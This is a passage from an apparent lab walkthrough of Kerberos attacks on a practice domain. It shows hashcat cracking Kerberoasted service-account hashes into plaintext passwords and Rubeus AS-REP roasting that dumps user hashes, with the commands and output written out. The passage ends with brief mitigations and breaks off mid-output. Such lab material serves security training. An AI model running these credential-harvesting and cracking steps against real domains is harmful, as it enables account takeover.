                             E61A19BFF02AD82B6FE92220A23A80C653C8B10557B915E2A1F05485BD5C2572765821509C23D9B5
                             49C048FF8DEA8FBE72149E14821DF7322E6CCFFAE5709E4DB90713764C0BBB84A23FC683FCF93D21
                             9238A13EF56D98EA18F7EFCD2C595DDB851CEC7D28BA55017F9DF513A47EBC83DF41B01918647C4E
                             697D04032F1E32A16C07E5B9471E082A5D54DB686AEE3B13D8B0386C79A6EC43569DD0D4A41CA2D1
                             477A7BDFD67DD7DA3ACF48F9050FC3ABEBF1D2C34439DD1B66B12E9323491539DF8EEFE41104EF80
                             912B7B55304F8F81AE7E7A8699A3AB1257A284E5992B6319ED7B22F7E9555D2958D3FD02C46C5C2C
                             F5683DABA6807E9724DDAB1674BFB4BAC6872BEC96DFBA7CB5E626E9E50E901FF9D527DFF749A57B
                             B47131D73BA2D67010C15E098F1DBCC82495B9249ABF4B71820E7235B9300C8D4049AA824016E2EC
                             51218EA726F9D4F83B61686AA23A12B4C0FAD994F482236212764EFCAE264322170E2F2F0965B30A
                             CD4F96AFD37750C7E626A4EE3B7D6E82245EA79C26ADE2E4900AC287C86652B95368AA45346EE5BB
                             C4222D8EC585819084D5E104886623494CFD5B90220B0AA74DABA7D121ED1F68629EBEC93F57DDE6
                             35F870017B93787E70FC808F73F7085C18F4ECE29233E094813FF99A719FFD7B0175A3C85B42AF15
                             E448103F59453E44DD084283F4EBF7606113C58C639B5B5472427CD6E842F66285B95AD300DDE0F3
                             42663851C11DFCDEB9546091A3425E5611B3B3798BE2D3D69C8226AF236628DFCAD253F8499E9F74
                             C791ADBBE20CA2D9BA9E3694ACB07062C7536DA38E1966F9666969667820D79F99FA9D3C9D435D7E
                             EE133CCA3CB76C727BD068DB415DAAFCB4DF781C0F40E226717EA7DBC01079EB617389ADD8B58088
                             9972F4D6C1A71A63F5EBA46A659E025F7A1D9FA47A17EC5E431C64835CC5BE29AA75EF527FF6FCC2
                             5E7EF8C33AA17C44D7C93F8A546A926C7E2147170E41D38FE0FB86F5EA6471FECAB4DBEDE5FD60EB
                             6CDC33A2601FDA32D1716E56B437EBF6C361463296C06218D45FFE6A8F527312EEE5841FAD771DA2
                             6BBED17C5BEC35F1973F653BF8AB672738E78C3B20E02BC8072217005B8E
```
```text
┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
└─$ nano hash1.txt (use cyberchef to remove white spaces from hash)
```

## Exploitation
```text
┌──(kali㉿kali)-[~/Downloads/learning_kerberos]
└─$ hashcat -m 13100 -a 0 hash1.txt Pass.txt
```
```text
3ea:Summer2020
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLE...2b83ea
```
What is the HTTPService Password? *Summer2020*
```text
98d773db32ff7d05e5f420f36946ea84554ac6bfaf912e5da357b1968ea108e6a0602a700a321d155e23fb7e568c:MYPassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER...7e568c
```
What is the SQLService Password? *MYPassword123#*
### AS-REP Roasting w/ Rubeus
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.
There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.
I have already compiled and put Rubeus on the machine.
AS-REP Roasting Overview -
During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
![](https://i.imgur.com/arAImcA.png)
Dumping KRBASREP5 Hashes w/ Rubeus -
1.) cd Downloads - navigate to the directory Rubeus is in
2.) Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
![](https://i.imgur.com/l3wJhby.png)
Crack those Hashes w/ hashcat -
1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
Use the same wordlist that you downloaded in task 4
3.) hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
![](https://i.imgur.com/eOqGVrm.png)
AS-REP Roasting Mitigations -
Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
```text
C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::49:32e1:c909:9ad7%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:312D3E75042839A3AF33CA7292416983$1139E48EE8EF
      89392F0EEA38BF7B035EAD1C641713E71AA24AD008B117330C81C262FC9AFF21F63BCDD5C7C090F1
      DF3CB014A79EAFFA554811DECEDC5A1AA368C20CBDB469FE6C40A6E63C8ABF93D5AA8678EF367574
      7797B58B3A2AAA9E5AAA0DDB49FBCA36BDB038D05496D396003D22E3FB958957D1A5E1F4CB2A8536
      9DFBD2EC960A11000C0AAF918FD3D9884D30738BC1A5A8D9406E4DE2D032BA5CB22559153349CB86
      B3AD86B9B66DFA6795894FD0015A78836EB13D0B8C97F2AF9989A3F15371F4D427C6D4B7391CF5A6
      045F450F7D3DCB722188CEE829A737C117DF88222B51580F9C91F9DC7861A7E1B5D0A18DE797

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::49:32e1:c909:9ad7%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
